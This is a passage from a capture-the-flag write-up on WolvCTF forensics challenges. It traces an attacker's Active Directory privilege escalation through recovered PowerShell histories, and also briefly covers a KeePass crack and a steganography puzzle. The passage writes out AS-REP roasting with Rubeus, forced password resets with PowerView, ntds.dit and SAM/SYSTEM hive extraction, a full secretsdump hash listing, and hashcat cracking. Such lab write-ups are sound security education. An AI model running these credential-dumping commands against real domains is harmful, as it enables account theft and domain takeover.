class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">enabl3_4ut0log0n_0k??!?&#125;</span></span><br></pre></td></tr></table></figure><h5 id="Escalation-dan-to-emily"><a href="#Escalation-dan-to-emily" class="headerlink" title="Escalation dan to emily"></a>Escalation dan to emily</h5><p>We find the <code>ConsoleHost_History.txt</code> for dan at the location <code>./Users/dan/AppData/Roaming/Microsoft/Windows/Powershell/PSReadLine</code> which gives following commands history when the attacker was as dan.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Desktop</span><br><span class="line">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix <span class="string">&quot;wolvctf_audit&quot;</span></span><br><span class="line">powershell -ep bypass</span><br><span class="line">.\SharpHound.ps1</span><br><span class="line">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix <span class="string">&quot;wolvctf_audit&quot;</span></span><br><span class="line">Import-Module \SharpHound.ps1</span><br><span class="line">Import-Module .\SharpHound.ps1</span><br><span class="line">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix <span class="string">&quot;wolvctf_audit&quot;</span></span><br><span class="line">.\Rubeus.exe asreproast /user:emily /domain:wolvctf.corp /dc:DC01.wolvctf.corp &gt; asreproast.output</span><br><span class="line"> .\Rubeus.exe kerberoast &gt; kerberoast.output</span><br><span class="line">runas /User:wolvctf\emily cmd`</span><br></pre></td></tr></table></figure><p>This suggests that the user tried to perform the AS-REP Roasting attack on Kerberos Authentication using Rubeus to get the password for emily. So we find the <code>asreproast.output</code> at the location <code>./Users/dan/Desktop</code> with following output.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: AS-REP roasting</span><br><span class="line"></span><br><span class="line">[*] Target User            : emily</span><br><span class="line">[*] Target Domain          : wolvctf.corp</span><br><span class="line">[*] Target DC              : DC01.wolvctf.corp</span><br><span class="line"></span><br><span class="line">[*] Using domain controller: DC01.wolvctf.corp (fe80::af8f:bc46:1257:36be%5)</span><br><span class="line">[*] Building AS-REQ (w/o preauth) <span class="keyword">for</span>: <span class="string">&#x27;wolvctf.corp\emily&#x27;</span></span><br><span class="line">[+] AS-REQ w/o preauth successful!</span><br><span class="line">[*] AS-REP <span class="built_in">hash</span>:</span><br><span class="line"></span><br><span class="line">      $krb5asrep<span class="variable">$emily</span>@wolvctf.corp:34C3460101DA5A3081FA4F6518A0ECE1<span class="variable">$619944A029EF908C7</span></span><br><span class="line">      8A80E2559C06788E2D86AEB1C94CD97E4540E5EA57C550C7FBD768D6EA24DBC66CFC6B8A9E39C364</span><br><span class="line">      39CA4B50DCF29F3C078785F876835B239B3628F561D080F83294C9A3BC8D1C4DEC538A15339257DC</span><br><span class="line">      AAB20F33EE168BDEA0671C4AB92DA6B089D7700E7BE42564706BFA903654EDF11376C1994BBE6B9C</span><br><span class="line">      C65E53275EF3148B638AA5A52284E29912C3CA2171FD50FBD6929511416B51F8C4F8CB9383DA74E8</span><br><span class="line">      DB3B0493A2654093C44BC399695525DD90E271A90C9992024A1D05E4188EC588663D2D849142AED6</span><br><span class="line">      5C5B77C38ED3DC7BB65178A565248F199B5DC2D382D2DA016DAD023</span><br><span class="line"></span><br><span class="line">[*_*] d2N0Znthc3IzcHIwNHN0M2Q/Xw==</span><br></pre></td></tr></table></figure><p>Now the base64 comment at the end gives us the first part of our second flag and on cracking this krb5asrep hash for emily using <code>John the Ripper</code> we can find the password for emily as <code>youdontknowmypasswordhaha</code>.</p><p>Flag 2.1: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;asr3pr04st3d?_</span></span><br></pre></td></tr></table></figure><h5 id="Escalation-emily-to-james"><a href="#Escalation-emily-to-james" class="headerlink" title="Escalation emily to james"></a>Escalation emily to james</h5><p>Again the Console History of emily reveals the following info.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\emily</span><br><span class="line">tree /f /a &gt; tree.txt</span><br><span class="line"><span class="built_in">type</span> tree.txt</span><br><span class="line"><span class="built_in">cd</span> Documents</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">type</span> README</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;James asked me to keep his password secret, so I made sure to take extra precautions.&quot;</span> &gt;&gt; C:\Users\Public\loot.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Note to self: Password for the zip is same as mine, with 777 at the end&quot;</span> &gt;&gt; C:\Users\Public\loot.txt</span><br><span class="line">del README</span><br><span class="line"><span class="built_in">cp</span> .\important.7z C:\Users\Public</span><br><span class="line">del C:\Users\Public\loot.txt</span><br><span class="line">del C:\Users\Public\important.7z</span><br><span class="line">runas /User:wolvctf\james cmd</span><br></pre></td></tr></table></figure><p>Which suggest the presence of importat.7z and since we know emily’s password we also know the password for the zip so we quicly extract the zip with the password <code>youdontknowmypasswordhaha777</code> to find 3 images in the zip car.jpeg, cat.jpg and cattttt.jpeg.</p><p><img src="/./images/imp_zip.png" alt="Image"></p><p>And on using binwalk on car.jpeg we get another image which bears the secodn part of flag 2 and also the password for james. Maybe the extra precaution that emily took hinted to this slight steganographic technique of byte scraping.</p><p><img src="/./images/car_bin.png" alt="Image"></p><p>Flag 2.2: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_</span></span><br></pre></td></tr></table></figure><h5 id="Escalation-james-to-patrick"><a href="#Escalation-james-to-patrick" class="headerlink" title="Escalation james to patrick"></a>Escalation james to patrick</h5><p>Viewing the console history for james reveals the following password change attampt.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\Public\Documents</span><br><span class="line"><span class="built_in">mv</span> .\PowerView.txt .\PowerView.ps1</span><br><span class="line">powershell -ep bypass</span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Find-DomainProcess</span><br><span class="line"><span class="variable">$NewPassword</span> = ConvertTo-SecureString <span class="string">&#x27;Password123!&#x27;</span> -AsPlainText -Force`</span><br><span class="line">Set-DomainUserPassword -Identity <span class="string">&#x27;emily&#x27;</span> -AccountPassword <span class="variable">$NewPassword</span></span><br><span class="line"><span class="variable">$NewPassword</span> = ConvertTo-SecureString <span class="string">&#x27;d0nt_us3_4ll3xtendedr1ghts&#125;&#x27;</span> -AsPlainText -Force`</span><br><span class="line">Set-DomainUserPassword -Identity <span class="string">&#x27;patrick&#x27;</span> -AccountPassword <span class="variable">$NewPassword</span></span><br><span class="line">runas /User:wolvctf\patrick cmd</span><br></pre></td></tr></table></figure><p>Which shows that the attacker ran PowerView.ps1 a PowerShell script for Active Directory (AD) enumeration and abuse to search for processes running in the domain, helping identify privileged accounts. If the attacker has reset privileges, they forcefully set new passwords for domain users emily and patrick and then get access as patrick. This also gives us the third part of our second flag.</p><p>Flag 2.3: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">d0nt_us3_4ll3xtendedr1ghts&#125;</span></span><br></pre></td></tr></table></figure><h5 id="Escalation-patrick-to-jake"><a href="#Escalation-patrick-to-jake" class="headerlink" title="Escalation patrick to jake"></a>Escalation patrick to jake</h5><p>Pretty straight forward as the password for jake was present in a <code>note_from_jake.txt</code> in the Desktop directory of patrick.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If you need anything backed up you can just use my account:</span><br><span class="line"></span><br><span class="line">Password: fwa3fe8#FEwef</span><br></pre></td></tr></table></figure><h5 id="Escalation-jake-to-jessica"><a href="#Escalation-jake-to-jessica" class="headerlink" title="Escalation jake to jessica"></a>Escalation jake to jessica</h5><p>The console history of jake looked like the follwong.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\Public\Downloads</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">cd</span> C:\Users\jake\desktop</span><br><span class="line"><span class="built_in">whoami</span> /all &gt; whoami.txt</span><br><span class="line"><span class="built_in">type</span> .\whoami.txt</span><br><span class="line"><span class="built_in">cd</span> C:\Users\public</span><br><span class="line"><span class="built_in">cd</span> downloads</span><br><span class="line">diskshadow.exe /s script.txt</span><br><span class="line">diskshadow.exe /s script.txt &gt; shadow.txt</span><br><span class="line"><span class="built_in">type</span> .\shadow.txt</span><br><span class="line"><span class="built_in">cp</span> .\shadow.txt C:\Users\jake\desktop\shadow.txt</span><br><span class="line">del shadow.txt</span><br><span class="line">robocopy /b z:\windows\ntds . ntds.dit &gt; robo.txt</span><br><span class="line"><span class="built_in">type</span> .\robo.txt</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">del robo.txt</span><br><span class="line"><span class="built_in">cp</span> ntds.dit C:\Users\jake\downloads</span><br><span class="line">del ntds.dit</span><br><span class="line"><span class="built_in">cd</span> C:\Users\jake\downloads</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">reg save hklm\system c:\<span class="built_in">users</span>\jake\downloads\system.hive</span><br><span class="line">reg save hklm\sam C:\<span class="built_in">users</span>\jake\downloads\sam.hive</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">cp</span> * C:\Users\public</span><br><span class="line">del C:\Users\public\ntds.dit</span><br><span class="line">del C:\Users\public\sam.hive</span><br><span class="line">del C:\Users\public\system.hive</span><br><span class="line">runas /User:wolvctf\jessica</span><br><span class="line">runas /User:wolvctf\jessica cmd</span><br></pre></td></tr></table></figure><p>Which suggests the attacker first ran <code>whoami /all</code> to get detailed user privileges and group memberships, useful for assessing permission levels and then ran a script.txt to like create a shadow copy of the drive, which allows access to locked files such as <code>ntds.dit</code>. Then he extract all ntds.dit, sam.hive and system.hive in order to exxtract jessica’s password and get her accesss.</p><p>One thing to note is that from the WinPEAS output we already know that Jessica is the domain admin so the last flag is nothing but jessica’s password.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Computer Name           :   DC01</span><br><span class="line">   User Name               :   jessica</span><br><span class="line">   User Id                 :   4107</span><br><span class="line">   Is Enabled              :   True</span><br><span class="line">   User Type               :   Administrator</span><br><span class="line">   Comment                 :   IT</span><br><span class="line">   Last Logon              :   3/18/2025 2:38:19 PM</span><br><span class="line">   Logons Count            :   1</span><br><span class="line">   Password Last Set       :   3/18/2025 2:34:06 PM</span><br></pre></td></tr></table></figure><p>Now NTDS.DIT (New Technology Directory Services Directory Information Tree) is the primary database file of Microsoft’s Active Directory Domain Services. Essentially, NTDS.DIT stores and organizes all the information related to objects in the domain, including users, groups, computers, and more. So on inspecting the ntds.dit we find the following piece of information.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Members</span> <span class="string">who</span> <span class="string">are</span> <span class="string">part</span> <span class="string">of</span> <span class="string">this</span> <span class="string">group</span> <span class="string">have</span> <span class="string">passwords</span> <span class="string">w</span> <span class="string">then</span> <span class="string">a</span> <span class="string">c</span> <span class="string">then</span> <span class="string">a</span> <span class="string">t</span> <span class="string">and</span> <span class="string">an</span> <span class="string">f,</span> <span class="string">curly</span> <span class="string">bracket</span> <span class="string">left,</span> <span class="string">&#x27;bloodhound_is_cool_&#x27;</span> <span class="string">(but</span> <span class="string">all</span> <span class="string">the</span> <span class="string">&#x27;o&#x27;</span><span class="string">s</span> <span class="string">are</span> <span class="string">&#x27;0&#x27;</span><span class="string">s),</span> <span class="string">then</span> <span class="string">a</span> <span class="string">city</span> <span class="string">in</span> <span class="string">all</span> <span class="string">lowercase</span> <span class="string">appended</span> <span class="string">by</span> <span class="number">3</span> <span class="string">numbers</span> <span class="string">(secret</span> <span class="string">only</span> <span class="string">you</span> <span class="string">know),</span>  <span class="string">right</span> <span class="string">curly</span> <span class="string">bracket.</span></span><br></pre></td></tr></table></figure><p>So we immediatiely jump to get the hashes for the users using registry hives and Impacket.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x32032d8f6ff9102e4202d192c152e02a</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: a802330d6d1dca4a57a459990af5e50e</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:1b921e44ea5dfd940c004044d4ef4cae:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b60be13c1c27a48e5c5afc10792afeab:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7f27814ee1fea90dc7495b265207db9d:::</span><br><span class="line">mssql_service:2102:aad3b435b51404eeaad3b435b51404ee:6092ca0e60d24f30d848a5def59d4753:::</span><br><span class="line">wolvctf.corp\james:4101:aad3b435b51404eeaad3b435b51404ee:4c20abe87d36b9ad715fd5671545abb5:::</span><br><span class="line">wolvctf.corp\emily:4102:aad3b435b51404eeaad3b435b51404ee:5c7a26ae4c40018fa1660cc2f1d82269:::</span><br><span class="line">wolvctf.corp\john:4103:aad3b435b51404eeaad3b435b51404ee:d24c1456aefeab3eb911c8015b9f6ce4:::</span><br><span class="line">wolvctf.corp\patrick:4104:aad3b435b51404eeaad3b435b51404ee:0311f96ce47c5cc21529fcc8375f9c2e:::</span><br><span class="line">wolvctf.corp\katherine:4105:aad3b435b51404eeaad3b435b51404ee:89218e0b151209e9d4fa0768ea72c70d:::</span><br><span class="line">wolvctf.corp\Amy:4106:aad3b435b51404eeaad3b435b51404ee:4aa4474c2886f6a796bd75eebe5ebf01:::</span><br><span class="line">wolvctf.corp\jessica:4107:aad3b435b51404eeaad3b435b51404ee:8fcdcffba18f392df7aa291527290aff:::</span><br><span class="line">wolvctf.corp\frank:4108:aad3b435b51404eeaad3b435b51404ee:b0212745c59fcf54f06ea501cd409ff5:::</span><br><span class="line">wolvctf.corp\chris:4109:aad3b435b51404eeaad3b435b51404ee:253cfc1375d39308ab1bb935b44e2010:::</span><br><span class="line">wolvctf.corp\renee:4110:aad3b435b51404eeaad3b435b51404ee:9b5109ef6dbc8086ed36a90c20aa1d48:::</span><br><span class="line">wolvctf.corp\peter:4111:aad3b435b51404eeaad3b435b51404ee:4f3cde005948d4e4fb232c35014ccafb:::</span><br><span class="line">wolvctf.corp\dan:4112:aad3b435b51404eeaad3b435b51404ee:e9d959da74f5c7590a80d635b36705a6:::</span><br><span class="line">wolvctf.corp\jake:4113:aad3b435b51404eeaad3b435b51404ee:cc4f0a96d3c0ce71b664e314b14ecd7e:::</span><br><span class="line">[*] Kerberos keys from ntds.dit</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:6b130a0ae6ddfb1628acf2ad84147e1ee38015a076aad76b03af0c1da43815a2</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:9d47fe6fc6471fed5d102f32dfa71eed</span><br><span class="line">Administrator:des-cbc-md5:01a1b5c21f94341c</span><br><span class="line">DC01$:aes256-cts-hmac-sha1-96:79c96d12dd9cc6369096bd8dbfe181d921aeffd4aaa53fc0d0263c7a665ee4c3</span><br><span class="line">DC01$:aes128-cts-hmac-sha1-96:47991a6fe70596e2f252209a7619ca93</span><br><span class="line">DC01$:des-cbc-md5:f7d6a4c8026df26e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:a570965739e477e5636b47289b0ebd351b89089f904ddf6ba676a95fc043caf6</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:d70b85a9394ab390cc7a7d3b294cf841</span><br><span class="line">krbtgt:des-cbc-md5:a720fbdfc429ce38</span><br><span class="line">mssql_service:aes256-cts-hmac-sha1-96:e3ae0982ea2ae94b4d989a89bbd966e593472e4653869b5188f0f0a175226bd0</span><br><span class="line">mssql_service:aes128-cts-hmac-sha1-96:80b0488a2d5c02a819e73f5184fd4609</span><br><span class="line">mssql_service:des-cbc-md5:13e51ff2c76802f8</span><br><span class="line">wolvctf.corp\james:aes256-cts-hmac-sha1-96:744c13c321ea323429238a196eab9b65bea41b13577b13cf2ae4775e2540da22</span><br><span class="line">wolvctf.corp\james:aes128-cts-hmac-sha1-96:1f60e252b18a1fe2edd73300996d3daa</span><br><span class="line">wolvctf.corp\james:des-cbc-md5:5babd3bc9be6797a</span><br><span class="line">wolvctf.corp\emily:aes256-cts-hmac-sha1-96:adcb0acc59b9454912378c69039bea23fee975074f9e0fd09b738cb1eb98fe54</span><br><span class="line">wolvctf.corp\emily:aes128-cts-hmac-sha1-96:1950a20a02f7e41d000546d0aed292fc</span><br><span class="line">wolvctf.corp\emily:des-cbc-md5:d5e58929a4b96b3d</span><br><span class="line">wolvctf.corp\john:aes256-cts-hmac-sha1-96:d7aa03485fdead391b6c32bca4ebf7f0b3e6dc2cfd20c3a240bf066cbda3f4a9</span><br><span class="line">wolvctf.corp\john:aes128-cts-hmac-sha1-96:df8b329de72ab17b743943e3a4023aca</span><br><span class="line">wolvctf.corp\john:des-cbc-md5:b931a88615a794ab</span><br><span class="line">wolvctf.corp\patrick:aes256-cts-hmac-sha1-96:e01f8578724ef569bf545872403df16a3ac16bc67604f911dd97df88f3363efd</span><br><span class="line">wolvctf.corp\patrick:aes128-cts-hmac-sha1-96:0895763e253a210250b544de1eba67d9</span><br><span class="line">wolvctf.corp\patrick:des-cbc-md5:57ba527967611658</span><br><span class="line">wolvctf.corp\katherine:aes256-cts-hmac-sha1-96:b41404d85f0286000725a603bc890c5941c2356446f1acc6c6b4b80bd5b9fb16</span><br><span class="line">wolvctf.corp\katherine:aes128-cts-hmac-sha1-96:32c9f2a4c32fa36dc248fea63c7a985f</span><br><span class="line">wolvctf.corp\katherine:des-cbc-md5:9b852fb319e68aa8</span><br><span class="line">wolvctf.corp\Amy:aes256-cts-hmac-sha1-96:88393904dcb9cfced8e477dbab7b8d2ce1967254789e075a932541dadb6a7561</span><br><span class="line">wolvctf.corp\Amy:aes128-cts-hmac-sha1-96:7970b15f1ff40798a75eb47a80b5d117</span><br><span class="line">wolvctf.corp\Amy:des-cbc-md5:73522c0170f120c1</span><br><span class="line">wolvctf.corp\jessica:aes256-cts-hmac-sha1-96:8088cf6ebf4fae379d3d8cf0689e60d6c0f6f6aed5a69946d93418ea4962de68</span><br><span class="line">wolvctf.corp\jessica:aes128-cts-hmac-sha1-96:8df17274caccb4e4ef84b0195669c842</span><br><span class="line">wolvctf.corp\jessica:des-cbc-md5:19daa74645e398ba</span><br><span class="line">wolvctf.corp\frank:aes256-cts-hmac-sha1-96:3dc99ada65b1bf26e6211c01dccaa3a87349afa35172c818a1e39ab6e1dd4035</span><br><span class="line">wolvctf.corp\frank:aes128-cts-hmac-sha1-96:96d28a2a24a9a5fdadb6b31c7eab64bd</span><br><span class="line">wolvctf.corp\frank:des-cbc-md5:1c6d2cad9e3dfd8c</span><br><span class="line">wolvctf.corp\chris:aes256-cts-hmac-sha1-96:725f11a59f1c77f6ff41dd745cfc36e5229d09f271f471f9c52d7ed97793101a</span><br><span class="line">wolvctf.corp\chris:aes128-cts-hmac-sha1-96:9d963b6be441bf2652dd4bc351415bed</span><br><span class="line">wolvctf.corp\chris:des-cbc-md5:2ca2e983e632e5ba</span><br><span class="line">wolvctf.corp\renee:aes256-cts-hmac-sha1-96:0ecee7ab365fd5a38999fae2ed19d3f02a9ed51e5987227023316ed8f19c77a2</span><br><span class="line">wolvctf.corp\renee:aes128-cts-hmac-sha1-96:9e94283c417a8abe8f7752564b251051</span><br><span class="line">wolvctf.corp\renee:des-cbc-md5:a1e69b1f1afef42a</span><br><span class="line">wolvctf.corp\peter:aes256-cts-hmac-sha1-96:9558878dce8606d877c804dbbfea9cc42e0d4903f46158f5d8fd804c4a4dd5c2</span><br><span class="line">wolvctf.corp\peter:aes128-cts-hmac-sha1-96:9e86af0d3775c494cdffa0be7190b030</span><br><span class="line">wolvctf.corp\peter:des-cbc-md5:0867d54016ba0704</span><br><span class="line">wolvctf.corp\dan:aes256-cts-hmac-sha1-96:f55a42a6f1784346962ff1c1e53c6e8384be32bcc781d90c4c8a1227dda3aebc</span><br><span class="line">wolvctf.corp\dan:aes128-cts-hmac-sha1-96:9579003b132f9d68609107529450c919</span><br><span class="line">wolvctf.corp\dan:des-cbc-md5:467cfb4a9dec7c46</span><br><span class="line">wolvctf.corp\jake:aes256-cts-hmac-sha1-96:f166119ffe48d3f1bd6cce6cfe796045943d6e161d9b864ef2668dbb0f83003b</span><br><span class="line">wolvctf.corp\jake:aes128-cts-hmac-sha1-96:fb335f8432d5caf9b5250568c6457122</span><br><span class="line">wolvctf.corp\jake:des-cbc-md5:54917531317aec83</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><p>Where we can find the NTLM hash for jessica so we create a custom wordlist for the flag using the know prefix and I used <a href="https://github.com/FinNLP/cities-list/blob/master/list.txt">cities.txt</a> for the cities part to create the custom wordlist for brute force using hashcat.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat --show -m 1000 8fcdcffba18f392df7aa291527290aff wordlistx.txt</span><br><span class="line">8fcdcffba18f392df7aa291527290aff:wctf&#123;bl00dh0und_is_c00l_votuporanga985&#125;</span><br></pre></td></tr></table></figure><p>And with the attacker gets Admin access and we get our last flag.</p><p>Flag 3: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;bl00dh0und_is_c00l_votuporanga985&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Flags-and-Conclusion"><a href="#Flags-and-Conclusion" class="headerlink" title="Flags and Conclusion"></a>Flags and Conclusion</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;d0nt_3n4bl3_xP_cmdsh311_w1th_d3fault_cr3ds_0r_enabl3_4ut0log0n_0k??!?&#125;</span></span><br><span class="line"><span class="string">wctf&#123;asr3pr04st3d?_sh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_d0nt_us3_4ll3xtendedr1ghts&#125;</span></span><br><span class="line"><span class="string">wctf&#123;bl00dh0und_is_c00l_votuporanga985&#125;</span></span><br></pre></td></tr></table></figure><p>Overall I really enjoyed this challenge series and a big shoutout to <code>@dree</code> for creating such fun challenges. The challenge helps in learn a lot about Kerboros, WinPEAS, NTDS and many other things.</p><h3 id="Passwords"><a href="#Passwords" class="headerlink" title="Passwords"></a>Passwords</h3><p>A fairly simply challenge where we are given a .kdbx file and all we had to was brute force the keepass password using rockoyu.txt to get password as <code>goblue1</code> and then just opening the file gives us the flag.</p><p><img src="/./images/wolv_kdbx.png" alt="Image"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;1_th0ught_1t_w4s_s3cur3?&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Breakout"><a href="#Breakout" class="headerlink" title="Breakout"></a>Breakout</h3><p>Another simple challenge where Stegseek on the given breakout.jpg reveals breakout.ch8 file file which on some googling turns out to be a chip8 game.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ stegseek --crack breakout.jpg rockyou.txt</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: <span class="string">&quot;&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;breakout.ch8&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;breakout.jpg.out&quot;</span>.</span><br></pre></td></tr></table></figure><p>So on loading this file in an online <a href="https://chip.netlify.app/emulator/">CHIP-8 emulator</a> we get a game and as soon as we complete the game we are given the flag.</p><p><img src="/./images/breakout.png" alt="Image"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 